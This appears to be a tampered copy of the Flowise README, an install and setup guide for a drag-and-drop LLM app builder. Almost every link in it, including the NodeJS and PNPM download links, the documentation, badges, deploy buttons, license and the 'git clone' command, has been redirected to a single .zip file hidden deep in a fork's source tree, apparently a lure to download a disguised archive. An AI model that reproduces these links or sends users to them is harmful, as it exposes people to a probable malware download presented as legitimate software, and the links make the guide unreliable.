<!-- markdownlint-disable MD030 -->

<img width="100%" src="https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip"></a>

# Flowise - Build LLM Apps Easily

[![Release Notes](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
[![Discord](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
[![Twitter Follow](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
[![GitHub star chart](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
[![GitHub fork](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

English | [中文](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip) | [日本語](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip) | [한국어](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

<h3>Drag & drop UI to build your customized LLM flow</h3>
<a href="https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip">
<img width="100%" src="https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip"></a>

## ⚡Quick Start

Download and Install [NodeJS](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip) >= 18.15.0

1. Install Flowise
    ```bash
    npm install -g flowise
    ```
2. Start Flowise

    ```bash
    npx flowise start
    ```

    With username & password

    ```bash
    npx flowise start --FLOWISE_USERNAME=user --FLOWISE_PASSWORD=1234
    ```

3. Open [http://localhost:3000](http://localhost:3000)

## 🐳 Docker

### Docker Compose

1. Go to `docker` folder at the root of the project
2. Copy `https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip` file, paste it into the same location, and rename to `.env`
3. `docker compose up -d`
4. Open [http://localhost:3000](http://localhost:3000)
5. You can bring the containers down by `docker compose stop`

### Docker Image

1. Build the image locally:
    ```bash
    docker build --no-cache -t flowise .
    ```
2. Run image:

    ```bash
    docker run -d --name flowise -p 3000:3000 flowise
    ```

3. Stop image:
    ```bash
    docker stop flowise
    ```

## 👨‍💻 Developers

Flowise has 3 different modules in a single mono repository.

-   `server`: Node backend to serve API logics
-   `ui`: React frontend
-   `components`: Third-party nodes integrations
-   `api-documentation`: Auto-generated swagger-ui API docs from express

### Prerequisite

-   Install [PNPM](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
    ```bash
    npm i -g pnpm
    ```

### Setup

1.  Clone the repository

    ```bash
    git clone https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip
    ```

2.  Go into repository folder

    ```bash
    cd Flowise
    ```

3.  Install all dependencies of all modules:

    ```bash
    pnpm install
    ```

4.  Build all the code:

    ```bash
    pnpm build
    ```

    <details>
    <summary>Exit code 134 (JavaScript heap out of memory)</summary>  
      If you get this error when running the above `build` script, try increasing the https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip heap size and run the script again:

        export NODE_OPTIONS="--max-old-space-size=4096"
        pnpm build

    </details>

5.  Start the app:

    ```bash
    pnpm start
    ```

    You can now access the app on [http://localhost:3000](http://localhost:3000)

6.  For development build:

    -   Create `.env` file and specify the `VITE_PORT` (refer to `https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip`) in `packages/ui`
    -   Create `.env` file and specify the `PORT` (refer to `https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip`) in `packages/server`
    -   Run

        ```bash
        pnpm dev
        ```

    Any code changes will reload the app automatically on [http://localhost:8080](http://localhost:8080)

## 🔒 Authentication

To enable app level authentication, add `FLOWISE_USERNAME` and `FLOWISE_PASSWORD` to the `.env` file in `packages/server`:

```
FLOWISE_USERNAME=user
FLOWISE_PASSWORD=1234
```

## 🌱 Env Variables

Flowise support different environment variables to configure your instance. You can specify the following variables in the `.env` file inside `packages/server` folder. Read [more](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

## 📖 Documentation

[Flowise Docs](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

## 🌐 Self Host

Deploy Flowise self-hosted in your existing infrastructure, we support various [deployments](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

-   [AWS](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
-   [Azure](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
-   [Digital Ocean](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
-   [GCP](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)
-   <details>
      <summary>Others</summary>

    -   [Railway](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

        [![Deploy on Railway](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

    -   [Render](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

        [![Deploy to Render](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

    -   [HuggingFace Spaces](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

        <a href="https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip"><img src="https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip" alt="HuggingFace Spaces"></a>

    -   [Elestio](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

        [![Deploy on Elestio](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

    -   [Sealos](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip%3FtemplateName%3Dflowise)

        [![](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip%3FtemplateName%3Dflowise)

    -   [RepoCloud](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

        [![Deploy on RepoCloud](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

      </details>

## ☁️ Flowise Cloud

[Get Started with Flowise Cloud](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

## 🙋 Support

Feel free to ask any questions, raise problems, and request new features in [discussion](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

## 🙌 Contributing

Thanks go to these awesome contributors

<a href="https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip">
<img src="https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip" />
</a>

See [contributing guide](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip). Reach out to us at [Discord](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip) if you have any questions or issues.
[![Star History Chart](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip)

## 📄 License

Source code in this repository is made available under the [Apache License Version 2.0](https://raw.githubusercontent.com/mouneshbtc/Flowise/main/packages/components/nodes/chains/VectaraChain/Flowise_1.4.zip).
